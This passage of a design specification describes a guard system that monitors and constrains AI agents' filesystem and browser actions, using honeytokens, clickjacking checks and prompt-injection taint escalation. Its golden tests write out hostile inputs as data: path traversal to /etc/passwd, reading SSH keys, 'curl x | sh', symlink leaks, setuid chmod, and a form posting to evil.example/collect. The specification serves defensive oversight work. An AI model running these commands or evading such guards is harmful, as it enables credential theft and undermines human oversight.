- **Effect (single hit):** verdict DENY; `run.flags.honeytoken_hits += 1`; `run.flags.compromise_suspected = true`; ledger `honeytoken.triggered` (durable) `{path, via: "fs|cli|net", action_id}`; WebSocket event; subsequent high-impact actions → ASK_HUMAN via HUB-008. Two hits → hub HALT (`halt_reason="HONEYTOKEN_EXFIL_ATTEMPT"`).
- Honeytoken files are **excluded from promotion** and hidden from `ChangeSet` unless modified.

## 4.10 Promotion algorithm (`fs/promote.py`)
```
Input: run, paths|None, acknowledge{protected,sensitive,binary}, force, approved_by
1. cs = ChangeSet(baseline → fresh scan of scratch)  [scan failure → 409 INVALID_STATE]
2. candidates = cs.files filtered by `paths` (paths validated with FsPathValidator relative form)
3. drop: honeytokens; symlink_added (never promoted); deleted files only if `paths` explicitly lists them (default promote-all does NOT propagate deletions unless `include_deletions:true`)
4. classify: protected/sensitive/binary/executable → require listing in `acknowledge.<class>`; else skipped(reason="<class>_not_acknowledged")
   `auto_promote_safe=true` may skip human presence but still refuses any classified file.
5. drift check per file (unless force): host_hash(path) must equal baseline hash (or both absent) else conflict.
6. apply per file with the same no-follow/temp+rename semantics against host_path root; set mode to scratch mode & ~0o6000; create parent dirs; never write outside host root (validate with realpath containment again).
7. ledger workspace.promoted (durable): {promoted:[...sha256...], skipped, conflicts, approved_by, note}
8. state.promoted_at = now; baseline for subsequent promotes = current scratch manifest.
```
Atomicity is per file (not transactional); on any I/O error abort remaining and return `207`-style result body with `promoted` so far and `error` — never leave temp files (cleanup in `finally`).

## 4.11 Failure modes (filesystem)

| # | Condition | Required behavior |
|---|---|---|
| FS-F1 | Prefetch fails / times out | `HUB-009` ASK_HUMAN; analyzer emits `FS-000` ASK_HUMAN |
| FS-F2 | TOCTOU: file replaced between approval and execution | executor CAS check → `CHANGED_SINCE_APPROVAL`, no write, `next_step=REPLAN` |
| FS-F3 | Symlink swap race inside scratch | `O_NOFOLLOW` no-follow traversal → `SYMLINK_REFUSED` |
| FS-F4 | Disk full / EIO | `FAILED IO_ERROR`; temp file removed; 2 consecutive → run PAUSED |
| FS-F5 | Path Unicode tricks / case collisions (`.GIT` vs `.git`) | case-insensitive globs + NFC normalization (4.5.2) |
| FS-F6 | Huge directory (100k files) | list capped; recursive delete counts capped at 10,000 → treated as "mass" (ASK) |
| FS-F7 | Hub crash during promote | per-file atomic rename; on restart `workspace.promoted` missing ⇒ admin can re-run promote (idempotent by content hash: already-equal files are reported as `promoted` with `noop:true`) |
| FS-F8 | `host_path` modified during run | detected at promote (drift) → 409 conflicts |
| FS-F9 | Integrity scan too slow | 2 s cap → run PAUSED (4.8.2) |
| FS-F10 | Agent tries to overwrite guard config | FS-005 DENY; CLI writes reverted by 4.8.2 (a) |
| FS-F11 | Symlink in host tree points outside host | skipped at copy (4.3.1.3) |
| FS-F12 | `workspace_root` mismatch between task and container mount | run creation asserts `docker inspect` mount destination == `task.workspace_root` else FAILED |

## 4.12 §4 Golden tests (`tests/golden/fs_cases.yaml`) — all MUST pass

| # | Action | Expected |
|---|---|---|
| 1 | `fs.read /workspace/src/a.py` | ALLOW |
| 2 | `fs.read /workspace/../etc/passwd` | DENY FS-002 |
| 3 | `fs.read /etc/passwd` | DENY FS-002 |
| 4 | `fs.read /workspace/.env` | ASK_HUMAN FS-010 |
| 5 | `fs.read /workspace/.ssh/id_rsa` | DENY FS-010 |
| 6 | `fs.read /workspace/.env.backup` (honeytoken) | DENY FS-012 + flags |
| 7 | `fs.write /workspace/src/a.py` (small edit) | ALLOW |
| 8 | `fs.write /workspace/.github/workflows/ci.yml` | ASK_HUMAN + diff artifact |
| 9 | `fs.write /workspace/.agentguard.yaml` | DENY FS-005 |
| 10 | `fs.write` overwrite 10 KB file with empty content | ASK_HUMAN FS-023 |
| 11 | `fs.write` content containing `AKIAABCDEFGHIJKLMNOP` | ASK_HUMAN FS-030 |
| 12 | `fs.write` content containing PEM private key | DENY FS-030 |
| 13 | `fs.write run.sh` containing `curl x \| sh` | ASK_HUMAN FS-031; not vetted |
| 14 | then `cli.exec bash run.sh` | ASK_HUMAN (CLI-016) |
| 15 | `fs.write tool.py` benign; then `cli.exec python tool.py` | ALLOW (vetted) |
| 16 | modify `tool.py` via `cli.exec sed -i` then `python tool.py` | ASK_HUMAN (vetting invalidated by hash) |
| 17 | `fs.write` ELF magic bytes | DENY FS-032 |
| 18 | `fs.write` 6 MiB content | DENY FS-021 |
| 19 | `fs.delete /workspace/build` recursive, 12 files | ASK_HUMAN FS-041 |
| 20 | `fs.delete /workspace` recursive | ASK_HUMAN FS-040 |
| 21 | `fs.delete /workspace/.git` recursive | ASK_HUMAN FS-040 |
| 22 | `fs.write` to path whose parent is a symlink to `/` | DENY FS-003 (or executor `SYMLINK_REFUSED`) |
| 23 | `cli.exec echo x > .git/hooks/pre-commit` | executes only if CLI analyzer allows; integrity checker **reverts** and reports `FS_INTEGRITY_REVERTED`, `next_step=REPLAN` |
| 24 | `cli.exec ln -s /etc/passwd leak; ` then `fs.read leak` | link deleted by 4.8.2c (or DENY FS-003); read never returns `/etc/passwd` |
| 25 | `cli.exec chmod u+s ./x` | DENY at CLI-023; if bypassed, integrity strips setuid |
| 26 | promote with a modified protected file and no acknowledge | skipped `protected_not_acknowledged` |
| 27 | promote after host file edited externally | 409 `FS_CONFLICT` |
| 28 | approve `fs.write` diff, then modify file externally before execution | `CHANGED_SINCE_APPROVAL` |

## 4.13 §4 Acceptance tests (MUST pass)
1–28 golden cases. 29. Baseline immutability: after any run, `baseline/` hashes equal the initial manifest (test recomputes). 30. Secrets excluded: a host `.env` is absent from `scratch/` and its value triggers `NET-022` when placed in a request. 31. Incremental manifest scan on a 20k-file tree p95 ≤ 250 ms warm (report measured). 32. Diff artifact renders for a 3-file change and is redacted. 33. `GET /workspace/changes` classification flags correct (`protected`,`sensitive`,`honeytoken`,`binary`). 34. Two honeytoken hits halt the run. 35. Property test (hypothesis): random path strings never yield a `rel_path` that escapes scratch after normalization; `open_no_follow` never leaves the root (test with adversarial symlink trees).

---

# §5 — GUI / BROWSER GUARD

## 5.1 Purpose, scope and architecture

The guard for agents that operate a **web UI**. Prototype scope is a **browser** (Chromium via Playwright) — desktop-OS accessibility APIs and on-device vision are **out of scope for the prototype and shown as roadmap only** (do not implement; mention in README).

Key security ideas (all deterministic, no LLM in the decision path):
1. **Element identity by reference, not by pixel/selector.** The agent sees a compact accessibility snapshot with opaque `ref`s; every click/type must cite `snapshot_id` + `ref`. Refs map to Chromium `backendDOMNodeId`s held **host-side** — page scripts cannot forge them.
2. **Classify the element before acting** (label lexicon, attributes, form action, page URL, hidden/deceptive traits).
3. **Verify-then-act:** immediately before dispatching input, re-check that the element under the click point is the same element with the same accessible name (defeats clickjacking / DOM swaps).
4. **Network containment:** the browser's traffic goes through the egress proxy (Part 1 §3) — all navigation and subresource requests are re-checked there.

```
Agent ─ gui.snapshot ─► hub ─► BrowserExecutor(CDP AX tree + DOM facts) ─► SnapshotStore(host mem) ─► agent gets tree+refs
Agent ─ gui.click{snapshot_id,ref} ─► GuiPrefetch(look up ElementFacts, focused element) ─► GuiAnalyzer(pure) ─► verdict
        ALLOW ─► BrowserExecutor: verify-then-act ─► CDP Input.dispatch* ─► settle ─► new snapshot in result
        ASK ─► Approval with screenshot + highlighted element (Stitch UI) 
Browser ─(egress via proxy, identity run_id)─► internet
```

## 5.2 Browser runtime and containment [MVP]

### 5.2.1 Container (`AG_BROWSER_IMAGE`, created lazily on the run's first `gui.*` action, one per run: `ag-br-<run_id>`)
Base `mcr.microsoft.com/playwright:v<pinned>-jammy`; created with the same hardening as Part 1 §2.9.2 (`cap_drop=ALL`, `no-new-privileges`, `pids_limit=256`, `mem_limit=1g`, `read_only=True`, tmpfs for `/tmp`,`/home/pwuser`,`/dev/shm`(size 256m), user `pwuser`) **except** the seccomp profile is Docker default (Chromium needs a broader syscall set) and Chromium runs with `--no-sandbox` (its own sandbox needs user namespaces; the container is the sandbox — document this explicitly in README as a deliberate trade-off).

### 5.2.2 Networks (critical)
- `agentguard_internal` (existing): browser container attached → traffic to proxy.
- `agentguard_ctl` (**new**, `internal: true`): attached to **hub and browser containers only**; **never** to CLI sandbox containers. The Playwright server (`npx playwright run-server --port 3000 --path /<32-byte-random-hex>`) MUST bind only to the container IP on `agentguard_ctl` (entrypoint selects the interface whose IP lies in `AG_CTL_SUBNET`). CDP debugging port stays bound to `127.0.0.1` inside the browser container. Result: the agent's CLI sandbox (on `agentguard_internal` only) cannot reach the browser control channel and thus cannot drive the browser around the hub.
- Chromium proxy: `--proxy-server=http://proxy:8899`, credentials via Playwright `proxy={"server":..., "username": run_id, "password": proxy_token}`; the mitmproxy CA installed into the Chromium NSS DB at image build/entrypoint (so no `ignore_https_errors` needed).

### 5.2.3 Browser context settings (Playwright `browser.new_context`)
`accept_downloads=False`, `service_workers="block"`, `permissions=[]` (deny all), `java_script_enabled=True`, `bypass_csp=False`, `ignore_https_errors=False`, `viewport={"width":1280,"height":800}`, `locale="en-US"`, `user_agent` default + suffix ` AgentGuard`, `storage_state=None`, `offline=False`, `record_video=None`.
Event handlers (registered by the executor; each logs to ledger as noted):
- `page.on("dialog")`: **auto-dismiss** (`dialog.dismiss()`), record `{type,message[:200]}`, ledger `gui.dialog`; message text is scanned for injection (Part 1 §3.8.1).
- `context.on("page")` (popup/new tab): if total pages > `policy.gui.max_tabs` (default 3) or the opener isn't the run's page → close immediately, ledger `gui.popup_blocked`; else keep, new tab URL must still pass `evaluate_url` (checked by the proxy anyway).
- `page.on("filechooser")`: cancel (`file_chooser.set_files([])`), finding `GUI-031` retroactive flag.
- `page.on("download")`: cancel/`download.cancel()`, record.
- `context.route("**/*")`: **no JS interception** for security decisions (proxy is authoritative); the route handler only blocks `ws://`/`wss://` unless `upgrade_websocket`, and aborts requests to schemes other than `http(s)`, `about:blank`, `data:` (images/fonts only).

## 5.3 Data models (`gui/models.py`)

```python
class GuiSnapshotParams(BaseModel):
    full_page_text: bool = False
    max_nodes: int = Field(default=300, ge=20, le=600)
class GuiNavigateParams(BaseModel):
    url: str = Field(min_length=8, max_length=8192)
    wait_until: Literal["domcontentloaded","load","networkidle"] = "load"
    timeout_s: int = Field(default=20, ge=1, le=60)
class GuiClickParams(BaseModel):
    snapshot_id: str; element_ref: str = Field(pattern=r"^e[0-9]{1,5}$")
    button: Literal["left","right"] = "left"; click_count: Literal[1,2] = 1
class GuiTypeParams(BaseModel):
    snapshot_id: str; element_ref: str = Field(pattern=r"^e[0-9]{1,5}$")
    text: str = Field(max_length=2000); clear_first: bool = False; submit: bool = False   # submit = press Enter afterwards
class GuiSelectParams(BaseModel):
    snapshot_id: str; element_ref: str = Field(pattern=r"^e[0-9]{1,5}$"); value: str = Field(max_length=200)
class GuiPressParams(BaseModel):
    key: Literal["Enter","Tab","Escape","Backspace","Delete","ArrowUp","ArrowDown","ArrowLeft","ArrowRight","PageUp","PageDown","Home","End","Space"]
# Modifier combos (Ctrl/Alt/Meta+key), raw coordinates, drag/drop, file uploads: NOT supported → 422 SCHEMA_INVALID (extra="forbid")

class ElementFacts(BaseModel):                       # produced by BrowserExecutor.describe(); stored in SnapshotStore
    ref: str; role: str; name: str                   # accessible name (≤200 chars)
    text: str                                        # visible text (≤200)
    tag: str; input_type: str | None                 # e.g. "password","submit","file","text"
    attrs: dict[str, str]                            # allowlist: id,class,name,href,formaction,type,value(for non-password),title,aria-label,aria-describedby,data-testid,data-action,autocomplete,download,target,rel,disabled
    form_action: str | None; form_method: str | None # from nearest ancestor <form> or formaction
    href_abs: str | None                             # absolute resolved link target
    in_iframe: bool; frame_url: str | None; cross_origin_frame: bool
    visible: bool; in_viewport: bool; opacity: float; size: tuple[int,int]; covered: bool     # covered = elementFromPoint(center) != element
    name_text_mismatch: bool                         # aria-label/title semantics ≠ visible text (see 5.5.3)
    bbox: tuple[int,int,int,int]                     # x,y,w,h in CSS px
    name_hash: str                                   # sha256(NFKC casefold(name + "|" + role))[:16]
    ancestors: list[str]                             # up to 5 ancestor roles/tags, e.g. ["form","dialog","main"]

class PageFacts(BaseModel):
    url: str; title: str; epoch: int                 # epoch increments on every top-level navigation/load
    text_taint_level: int; text_taint_reasons: list[str]   # scan_response() over visible text (Part 1 §3.8.1)
    dialog_open: bool; tab_count: int
    risky_url: bool

class Snapshot(BaseModel):
    snapshot_id: str                                 # "gsn_<ulid>"
    page: PageFacts
    tree_text: str                                   # compact text shown to the agent (5.4.2), ≤ 30 KB
    elements: dict[str, ElementFacts]                # ref → facts (host-side ONLY; not returned to the agent)
    screenshot_path: str | None
    taken_at: str
```

Policy (`GuiPolicy`, from §7; defaults):
```python
class GuiPolicy(BaseModel):
    lexicon: dict[str, list[str]]        # see 5.5.1 (extended by rule packs, §6 `gui_label`)
    category_verdicts: dict[str, tuple[Literal["ASK_HUMAN","DENY"], int]] = {
        "destructive": ("ASK_HUMAN", 65), "financial": ("ASK_HUMAN", 75), "admin": ("ASK_HUMAN", 60),
        "publish": ("ASK_HUMAN", 55), "auth_change": ("ASK_HUMAN", 70)}
    block_financial: bool = False        # True → DENY / 85
    risk_url_globs: list[str] = ["*/admin*","*/settings/security*","*/billing*","*/account/delete*","*/oauth/authorize*","*/checkout*","*/payment*","*/api-keys*","*/tokens*"]
    max_tabs: int = 3
    allow_downloads: bool = False
    allow_credential_typing: bool = False
    typed_text_max: int = 2000
    snapshot_max_age_s: int = 120
    settle_ms: int = 3000
```

## 5.4 API contracts and tool semantics

All GUI capabilities are `POST /v1/runs/{run_id}/actions` (Part 1 §1.4.2) with `action_type` ∈ `gui.*`. Examples:

**Navigate**
```json
{"client_action_id":"c-000201","action_type":"gui.navigate","params":{"url":"https://github.com/example/repo/issues","wait_until":"load"},"rationale":"Open issue list"}
```
**Snapshot** (read-only; ALLOW unless the page URL fails net policy)
```json
{"client_action_id":"c-000202","action_type":"gui.snapshot","params":{"max_nodes":250}}
// execution.stdout = tree_text; execution.meta = {"snapshot_id":"gsn_01J...","url":"...","title":"...","epoch":3,"element_count":87,"taint_level":0}
```
**Click**
```json
{"client_action_id":"c-000203","action_type":"gui.click","params":{"snapshot_id":"gsn_01J...","element_ref":"e14"},"rationale":"Open first issue"}
```
Every successful `gui.navigate|click|type|select|press` result **automatically includes a fresh snapshot** in `execution.stdout` (tree text) and `meta.snapshot_id`, so agents rarely need explicit `gui.snapshot`.

### 5.4.1 Additional endpoints
- `GET /v1/runs/{run_id}/gui/screenshot?snapshot_id=gsn_...&highlight=e14` (admin) → `image/jpeg` (quality 60, ≤ 1 MB); `highlight` draws a 3-px red rectangle around the element bbox (Pillow, at request time). Approvals for GUI actions embed this URL (5.7).
- `GET /v1/runs/{run_id}/gui/state` (admin) → `{"url","title","tab_count","epoch","last_snapshot_id","taint_level"}`.
- `POST /v1/debug/analyze/gui` (admin): body `{"action_type":"gui.click","params":{...},"element":{...ElementFacts...},"page":{...PageFacts...}}` → verdict + findings (pure; for tests and the policy tester UI).

### 5.4.2 Snapshot text format (`tree_text`) — deterministic
One node per line, indentation = depth (2 spaces): `[e14] button "Delete repository"`, `[e15] textbox "Search" value=""`, `[e16] link "Issues" → https://github.com/example/repo/issues`, `heading[level=2] "Open issues"`, `text "3 open"`. Include only nodes with role ∈ {link,button,textbox,searchbox,combobox,checkbox,radio,switch,menuitem,tab,option,slider,spinbutton,heading,img(with alt),listitem(with text)} plus non-empty `StaticText` merged into parent lines; skip `ignored`/`presentation`/hidden nodes. Truncate names to 100 chars, hrefs to 120. Password field values are never included. Append footer: `-- snapshot gsn_… url=<url> epoch=<n> nodes=<n>/<total> --`. Nodes beyond `max_nodes` → footer `truncated`. The text is wrapped by the SDK as untrusted content (Part 1 §3.8.1) and its taint level is computed from the **text of the whole page**, not just the tree.

### 5.4.3 Element description via CDP (no page-world JS) — `gui/describe.py`
Facts MUST come from CDP domains, never from JavaScript evaluated in the page's main world (page scripts can lie): `Accessibility.getFullAXTree` (role, name, ignored, properties, `backendDOMNodeId`); `DOM.describeNode(backendNodeId, depth=0, pierce=true)` and `DOM.getAttributes` after `DOM.pushNodesByBackendIdsToFrontend` (attributes, tag, `frameId`); `DOM.getBoxModel` (bbox); `CSS.getComputedStyleForNode` (`opacity`, `visibility`, `display`, `pointer-events`); `DOM.getNodeForLocation(x,y,includeUserAgentShadowDOM=false)` (covered check); ancestors via `DOM.requestChildNodes`/`describeNode` parent walk (≤ 5). Refs: `e<counter>` assigned per snapshot in tree order; `ref → backendDOMNodeId` kept only in host memory (`SnapshotStore`).
Page text for taint scanning: `DOMSnapshot.captureSnapshot`/`Accessibility` static text concatenated, ≤ 200 KB.

`SnapshotStore`: per run, keep last **3** snapshots + `current_snapshot_id` and `epoch`. A snapshot is **stale** iff `snapshot.page.epoch != current_epoch` or `age > snapshot_max_age_s`. Epoch increments on `Page.frameNavigated` (main frame), `Page.navigatedWithinDocument` (history pushState), and after any action executed by the guard that reports `navigation=True`.

## 5.5 Analyzer (`gui/analyzer.py`, `GuiAnalyzer.handles = {gui.navigate, gui.snapshot, gui.click, gui.type, gui.select, gui.press}`, timeout 50 ms, pure)

Prefetch (`GuiPrefetcher`, key `"gui"`, timeout 150 ms): looks up `Snapshot` by `snapshot_id`; returns `{"snapshot_found":bool,"stale":bool,"element":ElementFacts|None,"page":PageFacts,"focused":ElementFacts|None}`. `focused` is fetched only for `gui.press` (via isolated-world `document.activeElement` → `DOM.describeNode`; DOM getters cannot be overridden from an isolated world) and `gui.type` with `submit=True`. `gui.navigate` needs no prefetch beyond the current `PageFacts`.

### 5.5.1 Label lexicon (defaults; extensible by §6 packs)

| Category | Terms (case-folded, NFKC, matched on word boundaries; also matched against split tokens of `id`,`class`,`name`,`data-*`,`href` path segments using `[-_/. ]` and camelCase splitting) |
|---|---|
| `destructive` | delete, remove, erase, destroy, wipe, terminate, deactivate, close account, drop, purge, reset, revoke, uninstall, format, discard all, clear all, unsubscribe all, हटाएं, हटाओ, डिलीट, मिटाएं |
| `financial` | pay, purchase, buy, buy now, checkout, place order, confirm payment, transfer, send money, withdraw, subscribe, upgrade, donate, refund, top up, भुगतान, खरीदें |
| `admin` | admin, administrator, permissions, grant access, add user, invite, invite member, roles, api key, access token, personal access token, secret, ssh keys, deploy key, webhook, transfer ownership, make public, visibility |
| `publish` | publish, post, tweet, share, send, submit, deploy, release, merge, push, approve, confirm |
| `auth_change` | change password, update password, change email, two-factor, 2fa, disable mfa, recovery codes, security settings |

Normalization for matching: NFKC → casefold → remove zero-width/bidi chars → collapse whitespace; strip leading/trailing punctuation/emoji. **Fields checked:** `name`, `text`, `attrs[aria-label|title|value|id|class|name|data-testid|data-action]`, `href_abs` path, `form_action` path.
Precision guard: `publish` terms alone on a **link** role with same-origin `href` that is a plain navigation (`GET`, no `formaction`) are ignored (links that merely navigate are not actions); `submit`/`post` on a `textbox` role are ignored.

### 5.5.2 Rules (evaluated in order; collect all)

| ID | Applies | Condition | Verdict / sev | Reason |
|---|---|---|---|---|
| GUI-000 | click/type/select | `facts is None` or `snapshot_found==False` | D / 40 (*exempt from severity guide*) with `next_step` REPLAN | `GUI_STALE_SNAPSHOT` |
| GUI-080 | click/type/select | `stale == True` | D / 30 (*exempt*) | `GUI_STALE_SNAPSHOT` |
| GUI-001 | click | element role ∈ {button,link,menuitem,checkbox,switch,option,tab} and lexicon category hit per `category_verdicts` (`financial` → DENY/85 if `block_financial`) | per table (A / 55–75) | `GUI_RED_ZONE_<CATEGORY>` |
| GUI-002 | click | `input_type ∈ {submit,button,image}` **or** role `button` inside a `<form>` with `form_method` POST/None **and** any lexicon hit on the form's submit label → treated as click on a state-changing control; add +10 severity (cap 100) to the GUI-001 finding | modifier | — |
| GUI-003 | click | page `risky_url` (URL matches `risk_url_globs`) and element is state-changing (button/submit/`formaction`) | A / 60 | `GUI_RISKY_PAGE` |
| GUI-010 | click/type | deceptive/occluded: `not visible` or `opacity < 0.05` or `size w<4 or h<4` or `not in_viewport` (only matters for click) or `covered` or `name_text_mismatch` | D / 80 | `GUI_DECEPTIVE_ELEMENT` |
| GUI-011 | click | element inside a **cross-origin iframe** and state-changing | A / 65 | `GUI_DECEPTIVE_ELEMENT` |
| GUI-020 | navigate | `evaluate_url(url,"GET", net_policy)` findings merged (re-tagged `GUI-020/<NET rule>`); scheme ∈ {javascript, data, file, blob, about (≠ about:blank), chrome, view-source} → D / 90 | | `GUI_SCHEME_DENIED` (+ NET codes) |
| GUI-021 | navigate | URL query/fragment contains secrets/PII/canaries (run Part 1 scanner) | per NET-02x | NET codes |
| GUI-030 | click (submit-like) | `form_action` host ∉ allowed set (`NetPolicy.allow_domains`) **or** differs from the current page's registrable domain and not in `allow_domains` | A / 70 (D / 85 if host is in `deny_domains` or an IP literal) | `GUI_CROSS_ORIGIN_SUBMIT` |
| GUI-031 | click | `input_type == "file"` or role `button` whose facts indicate it opens a file chooser (`attrs.type=="file"` sibling/label association) | D / 80 | `GUI_FILE_UPLOAD` |
| GUI-032 | click | link has `download` attribute or `href_abs` path ends with `.exe,.msi,.dmg,.pkg,.apk,.deb,.rpm,.sh,.bat,.ps1,.jar,.zip,.tar,.gz,.7z,.iso` | `allow_downloads`? A / 60 : D / 70 | `GUI_DOWNLOAD_BLOCKED` |
| GUI-040 | type | `input_type == "password"` or `attrs.autocomplete` ∈ {`current-password`,`new-password`,`cc-number`,`cc-csc`,`cc-exp`,`one-time-code`} and not `allow_credential_typing` | D / 85 | `GUI_CREDENTIAL_FIELD` |
| GUI-041 | type, select | typed text scanned with Part 1 scanner (PII/secret/canary/entropy) → same verdict mapping as NET-020/022 | per NET | `GUI_TYPED_SECRET` |
| GUI-042 | type | `len(text) > typed_text_max` or text contains newline when `submit=False` in a single-line input | A / 45 | `GUI_TYPED_SECRET` |
| GUI-043 | type | `submit=True` → additionally evaluate as **click on the focused/next submit control** (`GUI-001/002/030` on the form's submit button if resolvable from `ancestors`/`form_action`; otherwise treat `form_action` per GUI-030) | modifier | — |
| GUI-050 | press | `key ∈ {Enter,Space}` → resolve `focused` element and evaluate GUI-001/002/003/010/030/031/032 exactly as a click on it; if `focused is None` → A / 50 | | per rule |
| GUI-051 | press | any key when `dialog_open` (dialogs are auto-dismissed; keypress meaningless) → no finding | — | — |
| GUI-060 | any | page `text_taint_level ≥ 1` and action is high-impact per Part 1 §3.8.3 item 4 (any GUI-001/002/030/031/032 finding present, or navigation to non-allowlisted domain) | A / 65 (hub HUB-004 also fires; deduplicate by reason code) | `TAINTED_CONTEXT_ESCALATION` |
| GUI-070 | click/type | element `disabled` | no verdict (executor returns `FAILED meta.error="DISABLED"`) | — |
| GUI-090 | any | tab_count > `max_tabs` | D / 60 | `GUI_POPUP_BLOCKED` |

`gui.snapshot`: only GUI-000-free path; returns no findings unless the current page URL fails `evaluate_url` (DENY) or `dialog_open` (ALLOW, informational).

### 5.5.3 `name_text_mismatch` computation (host-side, at describe time)
Let `A = normalize(aria-label or title or AX name)` and `V = normalize(visible text)`. Mismatch = `A` and `V` both non-empty, share no token of length ≥ 3, **and** (`A` hits a *benign* term set {cancel, close, back, ok, no, dismiss, learn more} while `V` hits any lexicon category, or vice-versa). This targets the classic "aria-label says Cancel, button text says Delete" trick.

### 5.5.4 Verdict examples (must be reproduced by unit tests)
`button "Delete repository"` on `github.com/x/y/settings` → ASK_HUMAN (destructive 65 + risky-page 60 + form-POST +10 → sev 75, reasons `GUI_RED_ZONE_DESTRUCTIVE`,`GUI_RISKY_PAGE`); `link "Issues"` same-origin → ALLOW; `textbox` type "hello" → ALLOW; type into `password` → DENY; click submit whose `form_action` = `https://evil.example/collect` → ASK_HUMAN (GUI-030, 70).

## 5.6 Executor (`gui/executor.py`, `BrowserExecutor.handles = {gui.*}`)

### 5.6.1 Common flow
1. Ensure browser container + Playwright connection (`playwright.chromium.connect(ws_url)`), one context per run, one primary page. Health check; on failure recreate once (state lost ⇒ `epoch += 1`, snapshots invalidated), else `EXECUTOR_UNAVAILABLE`.
2. Action-specific steps (5.6.2–5.6.6).
3. **Settle**: wait until network idle (Playwright `wait_for_load_state("networkidle")` capped at `settle_ms`) or DOM stable (no `Page.frameNavigated`/loading events for 300 ms).
4. **Capture** a new `Snapshot` (5.4.3) + screenshot; compute page taint; store; return `ExecutionResult(stdout=tree_text, output_tainted=(text_taint_level ≥ 1 → level 2 only raises run taint per Part 1 §3.8.2? **No**: for GUI use the same rule as web fetch: `output_tainted = text_taint_level ≥ 1`), meta={snapshot_id,url,title,epoch,element_count,taint_level,navigation:bool,blocked:[...]})`.
5. Redact tree text via `Redactor`.

### 5.6.2 `gui.navigate`
`page.goto(url, wait_until, timeout)`. If the proxy blocks (HTTP 403 with `X-AgentGuard-Decision`), Chromium shows an error page; detect `net::ERR_*`/status 403 header and return `FAILED`, `meta.blocked=[{"reason_codes":[...]}]`, reason `GUI_NAV_BLOCKED`. After load, evaluate final URL again with `evaluate_url` (defends redirect chains); if disallowed → navigate to `about:blank`, `FAILED GUI_NAV_BLOCKED`.

### 5.6.3 `gui.click` — verify-then-act (MUST)
```
1. facts = SnapshotStore[snapshot_id].elements[ref]; node = facts backend id
2. if page.epoch != snapshot.epoch → FAILED meta.error="STALE_SNAPSHOT" (no input)
3. (re)describe element now → facts_now. Require:
     facts_now.name_hash == facts.name_hash  AND  same role/tag  AND  bbox center moved ≤ 40 px
   else FAILED meta.error="ELEMENT_CHANGED", reason GUI_ELEMENT_CHANGED (no input)
4. scrollIntoView via CDP `DOM.scrollIntoViewIfNeeded`; recompute center (cx,cy) from `DOM.getBoxModel`
5. hit = DOM.getNodeForLocation(cx,cy); require hit.backendNodeId == node OR hit is a descendant of node (walk parents ≤ 5)
   else FAILED meta.error="OCCLUDED", reason GUI_OCCLUDED (this is the clickjacking defense; analyzer verdict is not re-run but a `gui.click` finding is appended in the result meta)
6. dispatch Input.dispatchMouseEvent mouseMoved→mousePressed→mouseReleased at (cx,cy), clickCount, button
7. settle + capture (5.6.1)
```
Post-click checks: if a **new top-level navigation** occurred, re-run `evaluate_url(final_url)` (ledger `net.egress` already logged by the proxy); if disallowed → `about:blank` + `GUI_NAV_BLOCKED`. If a dialog appeared: dismissed and reported in `meta.dialogs`.

### 5.6.4 `gui.type`
Focus via `DOM.focus(backendNodeId)` (after verify steps 2–3), optionally select-all+delete (`clear_first`), then `Input.insertText(text)` (no per-key events, avoids shortcut injection). `submit=True` → dispatch `Enter` keyDown/keyUp **only if** analyzer verdict covered GUI-043; capture. Passwords are never typed (GUI-040).

### 5.6.5 `gui.select`
`DOM.focus` + set via CDP `Input`-based option selection: for `<select>`: `Runtime.callFunctionOn` **in an isolated world** on the node to set `value` and dispatch `change` (allowed because isolated world; page cannot intercept the call, only observe events). Validate `value` ∈ options (from facts) else FAILED `INVALID_OPTION`.

### 5.6.6 `gui.press`
Dispatch `Input.dispatchKeyEvent` (keyDown/keyUp) for the named key only. Modifier combos impossible by schema.

### 5.6.7 `gui.snapshot`
Capture only (5.6.1 steps 3–5), no input.

### 5.6.8 Screenshot handling
Take JPEG (quality 60) per snapshot via `Page.captureScreenshot` (clip = viewport). Store in `${AG_ARTIFACTS_DIR}/<run_id>/<snapshot_id>.jpg`; keep the last 20 per run (LRU delete). Never included in agent-visible output.

## 5.7 Approval artifacts for GUI (`Approval.artifacts`, A2)
```json
{"kind":"gui","page_url":"https://github.com/x/y/settings","page_title":"Settings",
 "element":{"ref":"e14","role":"button","name":"Delete this repository","bbox":[820,540,190,36],"form_action":"/x/y/settings/delete","form_method":"POST"},
 "screenshot_url":"/v1/runs/run_.../gui/screenshot?snapshot_id=gsn_...&highlight=e14",
 "why":["GUI_RED_ZONE_DESTRUCTIVE","GUI_RISKY_PAGE"],
 "typed_text_preview":null}
```
Summary string format: `Click "<name>" (<role>) on <host><path>`.

## 5.8 Failure modes (GUI)

| # | Condition | Required behavior |
|---|---|---|
| G-1 | Browser container fails to start / crashes | `EXECUTOR_UNAVAILABLE`, `RETRY_AFTER`; second failure → run PAUSED; snapshots invalidated |
| G-2 | Snapshot stale / unknown | `GUI-080/000` DENY (sev 30/40), `next_step=REPLAN` (agent re-snapshots) |
| G-3 | Element changed / occluded at execution | FAILED (no input sent), `GUI_ELEMENT_CHANGED` / `GUI_OCCLUDED`, `REPLAN`; three occurrences in a run → flag compromise (`run.flags.compromise_suspected`) |
| G-4 | Page with canvas/shadow-closed DOM (no AX nodes) | `gui.snapshot` returns `element_count=0` + note; clicks impossible (no refs) — coordinate clicks unsupported by design |
| G-5 | JS dialog storm | auto-dismiss, cap 10 per action, then close page and recreate context (epoch++) |
| G-6 | Popup spam | closed immediately; > 5 in a run → `GUI-090` DENY on subsequent actions until admin `taint/clear` |
| G-7 | CDP call timeout (> 5 s) | `FAILED IO_ERROR`; if two consecutive → recreate browser |
| G-8 | Page navigates during action | `Execution context was destroyed` handled: mark `navigation=True`, epoch++, capture new snapshot, status SUCCEEDED with `meta.note="navigated"` |
| G-9 | Injection text in page | delivered with taint marker; high-impact GUI actions escalate (GUI-060) |
| G-10 | Agent tries to reach browser control channel from CLI sandbox | network isolation (5.2.2): connection refused/unreachable; integration test |
| G-11 | Download/upload attempts | cancelled at browser level regardless of verdict |
| G-12 | Cross-origin iframes with own refs | refs include `in_iframe`; frames handled via CDP `frameId`; unsupported frame types (OOPIF without attach) are omitted from snapshot |

## 5.9 §5 Golden tests (`tests/golden/gui_cases.yaml`, pure via `/debug/analyze/gui` with fixture `ElementFacts`)

| # | Element / action | Expected |
|---|---|---|
| 1 | link "Issues" same-origin, click | ALLOW |
| 2 | button "Save changes" in form POST to same origin | ALLOW |
| 3 | button "Delete repository", risky URL | ASK_HUMAN, sev ≥ 75 |
| 4 | button "Delete" aria-label "Cancel" | DENY GUI-010 |
